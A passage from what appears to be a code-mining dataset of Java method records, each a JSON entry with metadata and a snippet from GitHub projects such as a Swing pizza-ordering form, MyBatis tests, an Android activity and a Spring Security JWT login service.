"throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldSmallFocusGained(java.awt.event.FocusEvent evt) {//GEN-FIRST:event_jtxtfieldSmallFocusGained\n           if(jchkboxSpizza.isSelected())\n           {\n               jchkboxSpizza.setSelected(false);\n           }\n           jtxtfieldSmallP.setText(null);\n           \n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32118, "method_name": "jtxtfieldMediumFocusGained", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldMediumFocusGained(java.awt.event.FocusEvent evt) {//GEN-FIRST:event_jtxtfieldMediumFocusGained\n        if(jchkboxMpizza.isSelected())\n           {\n               jchkboxMpizza.setSelected(false);\n           }\n           jtxtfieldMediumP.setText(null);\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32119, "method_name": "jtxtfieldLargeFocusGained", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldLargeFocusGained(java.awt.event.FocusEvent evt) {//GEN-FIRST:event_jtxtfieldLargeFocusGained\n        if(jchkboxLpizza.isSelected())\n           {\n               jchkboxLpizza.setSelected(false);\n           }\n           jtxtfieldLargeP.setText(null);\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32120, "method_name": "jtxtfieldCocaFocusGained", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldCocaFocusGained(java.awt.event.FocusEvent evt) {//GEN-FIRST:event_jtxtfieldCocaFocusGained\n        if(jchkboxCoca.isSelected())\n           {\n               jchkboxCoca.setSelected(false);\n           }\n           jtxtfieldCocaP.setText(null);\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32121, "method_name": "jtxtfieldThumsFocusGained", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldThumsFocusGained(java.awt.event.FocusEvent evt) {//GEN-FIRST:event_jtxtfieldThumsFocusGained\n        if(jchkboxThums.isSelected())\n           {\n               jchkboxThums.setSelected(false);\n           }\n           jtxtfieldThumsP.setText(null);\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32122, "method_name": "jtxtfieldSpriteFocusGained", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldSpriteFocusGained(java.awt.event.FocusEvent evt) {//GEN-FIRST:event_jtxtfieldSpriteFocusGained\n        if(jchkboxSprite.isSelected())\n           {\n               jchkboxSprite.setSelected(false);\n           }\n           jtxtfieldSpriteP.setText(null);\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32123, "method_name": "jbtnTotalMouseClicked", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jbtnTotalMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jbtnTotalMouseClicked\n        double price1 =Double.parseDouble(jtxtfieldSmallP.getText());\n        double price2 =Double.parseDouble(jtxtfieldMediumP.getText());\n        double price3 =Double.parseDouble(jtxtfieldLargeP.getText());\n        double price4 =Double.parseDouble(jtxtfieldCocaP.getText());\n        double price5 =Double.parseDouble(jtxtfieldThumsP.getText());\n        double price6 =Double.parseDouble(jtxtfieldSpriteP.getText());\n        double price=price1+price2+price3+price4+price5+price6;\n        String Price=String.format(\"%.2f\", price);\n        jtxtfieldSub.setText(Price);\n        double tax=(price1+price2+price3+price4+price5+price6)*18/100;\n        String Tax=String.format(\"%.2f\", tax);\n        jtxtfieldTax.setText(Tax);\n        double total=price+tax;\n        String Total=String.format(\"%.2f\", total);\n        jtxtfieldTotal.setText(Total);\n        if(jtxtfieldSmall.getText()==null)\n        {\n            double tmp=0;\n            String Tmp=String.format(\"%.2f\", tmp);\n            jtxtfieldSmall.setText(Tmp);\n            jtxtfieldSmallP.setText(Tmp);\n        }\n        if(jtxtfieldMediumP.getText()==null)\n        {\n            double tmp=0;\n            String Tmp=String.format(\"%.2f\", tmp);\n            jtxtfieldMediumP.setText(Tmp);\n        }\n        if(jtxtfieldLargeP.getText()==null)\n        {\n            double tmp=0;\n            String Tmp=String.format(\"%.2f\", tmp);\n            jtxtfieldLargeP.setText(Tmp);\n        }\n        if(jtxtfieldCocaP.getText()==null)\n        {\n            double tmp=0;\n            String Tmp=String.format(\"%.2f\", tmp);\n            jtxtfieldCocaP.setText(Tmp);\n        }\n        if(jtxtfieldThumsP.getText()==null)\n        {\n            double tmp=0;\n            String Tmp=String.format(\"%.2f\", tmp);\n            jtxtfieldThumsP.setText(Tmp);\n        }\n        if(jtxtfieldSpriteP.getText()==null)\n        {\n            double tmp=0;\n            String Tmp=String.format(\"%.2f\", tmp);\n            jtxtfieldSpriteP.setText(Tmp);\n        }\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32124, "method_name": "jtxtfieldMediumKeyPressed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldMediumKeyPressed(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_jtxtfieldMediumKeyPressed\n        String EnterNumber=jtxtfieldMedium.getText();\n        double quantity=Double.parseDouble(EnterNumber);\n        double price=quantity*MediumPizza;\n        String Price=String.format(\"%.2f\", price);\n        jtxtfieldMediumP.setText(Price);\n        jchkboxMpizza.setSelected(true);\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32125, "method_name": "jtxtfieldLargeKeyPressed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldLargeKeyPressed(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_jtxtfieldLargeKeyPressed\n        String EnterNumber=jtxtfieldLarge.getText();\n        double quantity=Double.parseDouble(EnterNumber);\n        double price=quantity*LargePizza;\n        String Price=String.format(\"%.2f\", price);\n        jtxtfieldLargeP.setText(Price);\n        jchkboxLpizza.setSelected(true);\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32126, "method_name": "jtxtfieldCocaKeyPressed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldCocaKeyPressed(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_jtxtfieldCocaKeyPressed\n        String EnterNumber=jtxtfieldCoca.getText();\n        double quantity=Double.parseDouble(EnterNumber);\n        double price=quantity*CocaCola;\n        String Price=String.format(\"%.2f\", price);\n        jtxtfieldCocaP.setText(Price);\n        jchkboxCoca.setSelected(true);\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32127, "method_name": "jtxtfieldThumsKeyPressed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldThumsKeyPressed(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_jtxtfieldThumsKeyPressed\n        String EnterNumber=jtxtfieldThums.getText();\n        double quantity=Double.parseDouble(EnterNumber);\n        double price=quantity*ThumsUp;\n        String Price=String.format(\"%.2f\", price);\n        jtxtfieldThumsP.setText(Price);\n        jchkboxThums.setSelected(true);\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32128, "method_name": "jtxtfieldSpriteKeyPressed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldSpriteKeyPressed(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_jtxtfieldSpriteKeyPressed\n        String EnterNumber=jtxtfieldSprite.getText();\n        double quantity=Double.parseDouble(EnterNumber);\n        double price=quantity*Sprite;\n        String Price=String.format(\"%.2f\", price);\n        jtxtfieldSpriteP.setText(Price);\n        jchkboxSprite.setSelected(true);\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32129, "method_name": "jbtnReceiptMouseClicked", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jbtnReceiptMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jbtnReceiptMouseClicked\n        String msg=(\"\\tReceipt\\n\\nSmall Pizza : \"+jtxtfieldSmall.getText()+\"\\nMedium Pizza : \"+jtxtfieldMedium.getText()+\"\\nLarge Pizza : \"\n                  +jtxtfieldLarge.getText()+\"\\nCoca Cola : \"+jtxtfieldCoca.getText()+\"\\nThumsUp : \"+jtxtfieldThums.getText()+\"\\nSprite : \"\n                +jtxtfieldSprite.getText()+\"\\n\\n\\nTotal Amount : \"+jtxtfieldTotal.getText()+\" Rs.\"+\"\\n\\nThank you for order to us\");\n        jtxtfieldReceipt.setText(msg);\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32130, "method_name": "main", "class_name": "FoodOrder", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String args[]) {\n        /* Set the Nimbus look and feel */\n        //<editor-fold defaultstate=\"collapsed\" desc=\" Look and feel setting code (optional) \">\n        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.\n         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html \n         */\n        try {\n            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {\n                if (\"Nimbus\".equals(info.getName())) {\n                    javax.swing.UIManager.setLookAndFeel(info.getClassName());\n                    break;\n                }\n            }\n        } catch (ClassNotFoundException ex) {\n            java.util.logging.Logger.getLogger(FoodOrder.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (InstantiationException ex) {\n            java.util.logging.Logger.getLogger(FoodOrder.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (IllegalAccessException ex) {\n            java.util.logging.Logger.getLogger(FoodOrder.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (javax.swing.UnsupportedLookAndFeelException ex) {\n            java.util.logging.Logger.getLogger(FoodOrder.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        }\n        //</editor-fold>\n\n        /* Create and display the form */\n        java.awt.EventQueue.invokeLater(new Runnable() {\n            public void run() {\n                new FoodOrder().setVisible(true);\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32131, "method_name": "getId", "class_name": "UserWithNothingWithoutInterface", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getId() {\n    return id;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_proxyfactory_comparison/UserWithNothingWithoutInterface.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32132, "method_name": "setId", "class_name": "UserWithNothingWithoutInterface", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setId(Integer id) {\n    this.id = id;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_proxyfactory_comparison/UserWithNothingWithoutInterface.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32133, "method_name": "getName", "class_name": "UserWithNothingWithoutInterface", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getName() {\n    return name;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_proxyfactory_comparison/UserWithNothingWithoutInterface.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32134, "method_name": "setName", "class_name": "UserWithNothingWithoutInterface", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setName(String name) {\n    this.name = name;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_proxyfactory_comparison/UserWithNothingWithoutInterface.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32135, "method_name": "getOwner", "class_name": "UserWithNothingWithoutInterface", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Group", "snippet": "  public Group getOwner() {\n    return owner;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_proxyfactory_comparison/UserWithNothingWithoutInterface.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32136, "method_name": "setOwner", "class_name": "UserWithNothingWithoutInterface", "params": ["Group"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setOwner(Group owner) {\n    this.owner = owner;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_proxyfactory_comparison/UserWithNothingWithoutInterface.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32137, "method_name": "onCreate", "class_name": "MainzoomActivity", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void onCreate(Bundle savedInstanceState) {\n\t\tsuper.onCreate(savedInstanceState);\n\t\tsetContentView(R.layout.mainzoom);\n\t\t\n\t\ton=(Button)findViewById(R.id.button1);\n\t\ton.setOnClickListener(new OnClickListener() {\n\t\t\t\n\t\t\t@Override\n\t\t\tpublic void onClick(View v) {\n\t\t\t\t// TODO Auto-generated method stub\n\t\t\t\tAnimation ani=AnimationUtils.loadAnimation(getApplicationContext(), R.anim.zoomon);\n\t\t\t\tiv=(ImageView)findViewById(R.id.imageView1);\n\t\t\t\tiv.startAnimation(ani);\n\t\t\t}\n\t\t});\n\t\toff=(Button)findViewById(R.id.button2);\n\t\toff.setOnClickListener(new OnClickListener() {\n\t\t\t\n\t\t\t@Override\n\t\t\tpublic void onClick(View v) {\n\t\t\t\t// TODO Auto-generated method stub\n\t\t\t\tAnimation ani=AnimationUtils.loadAnimation(getApplicationContext(), R.anim.zoomoff);\n\t\t\t\tiv=(ImageView)findViewById(R.id.imageView1);\n\t\t\t\tiv.startAnimation(ani);\n\t\t\t}\n\t\t});\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/zoomtry/src/com/example/zoomtry/MainzoomActivity.java", "stars": "74", "class_props": {"extends": "Activity", "implements": null, "modifiers": ["public"]}}, {"id": 32138, "method_name": "onCreateOptionsMenu", "class_name": "MainzoomActivity", "params": ["Menu"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onCreateOptionsMenu(Menu menu) {\n\t\t// Inflate the menu; this adds items to the action bar if it is present.\n\t\tgetMenuInflater().inflate(R.menu.mainzoom, menu);\n\t\treturn true;\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/zoomtry/src/com/example/zoomtry/MainzoomActivity.java", "stars": "74", "class_props": {"extends": "Activity", "implements": null, "modifiers": ["public"]}}, {"id": 32139, "method_name": "shouldHaveRequiredStandardConstants", "class_name": "JdbcTypeTest", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldHaveRequiredStandardConstants() throws Exception {\n    for (String typeName : requiredStandardTypeNames) {\n      int typeCode = Types.class.getField(typeName).getInt(null);\n      JdbcType jdbcType = JdbcType.valueOf(typeName);\n      assertEquals(typeCode, jdbcType.TYPE_CODE);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/JdbcTypeTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 32140, "method_name": "shouldHaveDateTimeOffsetConstant", "class_name": "JdbcTypeTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldHaveDateTimeOffsetConstant() {\n    JdbcType jdbcType = JdbcType.valueOf(\"DATETIMEOFFSET\");\n    assertEquals(-155, jdbcType.TYPE_CODE);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/JdbcTypeTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 32141, "method_name": "getUid", "class_name": "FristSecurityData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "\tpublic Long getUid() {\n\t\treturn uid;\n\t}", "url": "https://raw.githubusercontent.com/BanqiJane/Bilibili_Danmuji/master/Bilibilidanmuji/src/main/java/xyz/acproject/danmuji/entity/FristSecurityData.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 32142, "method_name": "setUid", "class_name": "FristSecurityData", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setUid(Long uid) {\n\t\tthis.uid = uid;\n\t}", "url": "https://raw.githubusercontent.com/BanqiJane/Bilibili_Danmuji/master/Bilibilidanmuji/src/main/java/xyz/acproject/danmuji/entity/FristSecurityData.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 32143, "method_name": "getRoomid", "class_name": "FristSecurityData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "\tpublic Long getRoomid() {\n\t\treturn roomid;\n\t}", "url": "https://raw.githubusercontent.com/BanqiJane/Bilibili_Danmuji/master/Bilibilidanmuji/src/main/java/xyz/acproject/danmuji/entity/FristSecurityData.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 32144, "method_name": "setRoomid", "class_name": "FristSecurityData", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setRoomid(Long roomid) {\n\t\tthis.roomid = roomid;\n\t}", "url": "https://raw.githubusercontent.com/BanqiJane/Bilibili_Danmuji/master/Bilibilidanmuji/src/main/java/xyz/acproject/danmuji/entity/FristSecurityData.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 32145, "method_name": "getProtover", "class_name": "FristSecurityData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "\tpublic Integer getProtover() {\n\t\treturn protover;\n\t}", "url": "https://raw.githubusercontent.com/BanqiJane/Bilibili_Danmuji/master/Bilibilidanmuji/src/main/java/xyz/acproject/danmuji/entity/FristSecurityData.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 32146, "method_name": "setProtover", "class_name": "FristSecurityData", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setProtover(Integer protover) {\n\t\tthis.protover = protover;\n\t}", "url": "https://raw.githubusercontent.com/BanqiJane/Bilibili_Danmuji/master/Bilibilidanmuji/src/main/java/xyz/acproject/danmuji/entity/FristSecurityData.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 32147, "method_name": "getPlatform", "class_name": "FristSecurityData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getPlatform() {\n\t\treturn platform;\n\t}", "url": "https://raw.githubusercontent.com/BanqiJane/Bilibili_Danmuji/master/Bilibilidanmuji/src/main/java/xyz/acproject/danmuji/entity/FristSecurityData.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 32148, "method_name": "setPlatform", "class_name": "FristSecurityData", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setPlatform(String platform) {\n\t\tthis.platform = platform;\n\t}", "url": "https://raw.githubusercontent.com/BanqiJane/Bilibili_Danmuji/master/Bilibilidanmuji/src/main/java/xyz/acproject/danmuji/entity/FristSecurityData.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 32149, "method_name": "getClientver", "class_name": "FristSecurityData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getClientver() {\n\t\treturn clientver;\n\t}", "url": "https://raw.githubusercontent.com/BanqiJane/Bilibili_Danmuji/master/Bilibilidanmuji/src/main/java/xyz/acproject/danmuji/entity/FristSecurityData.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 32150, "method_name": "setClientver", "class_name": "FristSecurityData", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setClientver(String clientver) {\n\t\tthis.clientver = clientver;\n\t}", "url": "https://raw.githubusercontent.com/BanqiJane/Bilibili_Danmuji/master/Bilibilidanmuji/src/main/java/xyz/acproject/danmuji/entity/FristSecurityData.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 32151, "method_name": "getType", "class_name": "FristSecurityData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "\tpublic Integer getType() {\n\t\treturn type;\n\t}", "url": "https://raw.githubusercontent.com/BanqiJane/Bilibili_Danmuji/master/Bilibilidanmuji/src/main/java/xyz/acproject/danmuji/entity/FristSecurityData.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 32152, "method_name": "setType", "class_name": "FristSecurityData", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setType(Integer type) {\n\t\tthis.type = type;\n\t}", "url": "https://raw.githubusercontent.com/BanqiJane/Bilibili_Danmuji/master/Bilibilidanmuji/src/main/java/xyz/acproject/danmuji/entity/FristSecurityData.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 32153, "method_name": "getKey", "class_name": "FristSecurityData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getKey() {\n\t\treturn key;\n\t}", "url": "https://raw.githubusercontent.com/BanqiJane/Bilibili_Danmuji/master/Bilibilidanmuji/src/main/java/xyz/acproject/danmuji/entity/FristSecurityData.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 32154, "method_name": "setKey", "class_name": "FristSecurityData", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setKey(String key) {\n\t\tthis.key = key;\n\t}", "url": "https://raw.githubusercontent.com/BanqiJane/Bilibili_Danmuji/master/Bilibilidanmuji/src/main/java/xyz/acproject/danmuji/entity/FristSecurityData.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 32155, "method_name": "toString", "class_name": "FristSecurityData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String toString() {\n\t\treturn \"FristSecurityData [uid=\" + uid + \", roomid=\" + roomid + \", protover=\" + protover + \", platform=\"\n\t\t\t\t+ platform + \", clientver=\" + clientver + \", type=\" + type + \", key=\" + key + \"]\";\n\t}", "url": "https://raw.githubusercontent.com/BanqiJane/Bilibili_Danmuji/master/Bilibilidanmuji/src/main/java/xyz/acproject/danmuji/entity/FristSecurityData.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 32156, "method_name": "toJson", "class_name": "FristSecurityData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String toJson() {\n\t\treturn FastJsonUtils.toJson(new FristSecurityData(uid,roomid,protover,platform,clientver,type,key));\n\t}", "url": "https://raw.githubusercontent.com/BanqiJane/Bilibili_Danmuji/master/Bilibilidanmuji/src/main/java/xyz/acproject/danmuji/entity/FristSecurityData.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 32157, "method_name": "getAdminByUsername", "class_name": "UmsAdminServiceImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "UmsAdmin", "snippet": "    public UmsAdmin getAdminByUsername(String username) {\n        UmsAdminExample example = new UmsAdminExample();\n        example.createCriteria().andUsernameEqualTo(username);\n        List<UmsAdmin> adminList = adminMapper.selectByExample(example);\n        if (adminList != null && adminList.size() > 0) {\n            return adminList.get(0);\n        }\n        return null;\n    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/security-jwt/src/main/java/com/yyj/security/service/impl/UmsAdminServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["UmsAdminService"], "modifiers": ["public"]}}, {"id": 32158, "method_name": "register", "class_name": "UmsAdminServiceImpl", "params": ["UmsAdmin"], "throws": null, "modifiers": ["public"], "return_type": "UmsAdmin", "snippet": "    public UmsAdmin register(UmsAdmin umsAdminParam) {\n        UmsAdmin umsAdmin = new UmsAdmin();\n        BeanUtils.copyProperties(umsAdminParam, umsAdmin);\n        umsAdmin.setCreateTime(new Date());\n        umsAdmin.setStatus(1);\n        //\u67e5\u8be2\u662f\u5426\u6709\u76f8\u540c\u7528\u6237\u540d\u7684\u7528\u6237\n        UmsAdminExample example = new UmsAdminExample();\n        example.createCriteria().andUsernameEqualTo(umsAdmin.getUsername());\n        List<UmsAdmin> umsAdminList = adminMapper.selectByExample(example);\n        if (umsAdminList.size() > 0) {\n            return null;\n        }\n        //\u5c06\u5bc6\u7801\u8fdb\u884c\u52a0\u5bc6\u64cd\u4f5c\n        String encodePassword = passwordEncoder.encode(umsAdmin.getPassword());\n        umsAdmin.setPassword(encodePassword);\n        adminMapper.insert(umsAdmin);\n        return umsAdmin;\n    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/security-jwt/src/main/java/com/yyj/security/service/impl/UmsAdminServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["UmsAdminService"], "modifiers": ["public"]}}, {"id": 32159, "method_name": "login", "class_name": "UmsAdminServiceImpl", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String login(String username, String password) {\n        String token = null;\n        try {\n            UserDetails userDetails = userDetailsService.loadUserByUsername(username);\n            if (!passwordEncoder.matches(password, userDetails.getPassword())) {\n                throw new BadCredentialsException(\"\u5bc6\u7801\u4e0d\u6b63\u786e\");\n            }\n            UsernamePasswordAuthenticationToken authentication = new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities());\n            SecurityContextHolder.getContext().setAuthentication(authentication);\n            token = jwtTokenUtil.generateToken(userDetails);\n        } catch (AuthenticationException e) {\n            LOGGER.warn(\"\u767b\u5f55\u5f02\u5e38:{}\", e.getMessage());\n        }\n        return token;\n    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/security-jwt/src/main/java/com/yyj/security/service/impl/UmsAdminServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["UmsAdminService"], "modifiers": ["public"]}}, {"id": 32160, "method_name": "getPermissionList", "class_name": "UmsAdminServiceImpl", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "List<UmsPermission>", "snippet": "    public List<UmsPermission> getPermissionList(Long adminId) {\n        return adminRoleRelationDao.getPermissionList(adminId);\n    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/security-jwt/src/main/java/com/yyj/security/service/impl/UmsAdminServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["UmsAdminService"], "modifiers": ["public"]}}, {"id": 32161, "method_name": "getDatabaseId", "class_name": "VendorDatabaseIdProvider", "params": ["DataSource"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getDatabaseId(DataSource dataSource) {\n    if (dataSource == null) {\n      throw new NullPointerException(\"dataSource cannot be null\");\n    }\n    try {\n      return getDatabaseName(dataSource);\n    } catch (Exception e) {\n      LogHolder.log.error(\"Could not get a 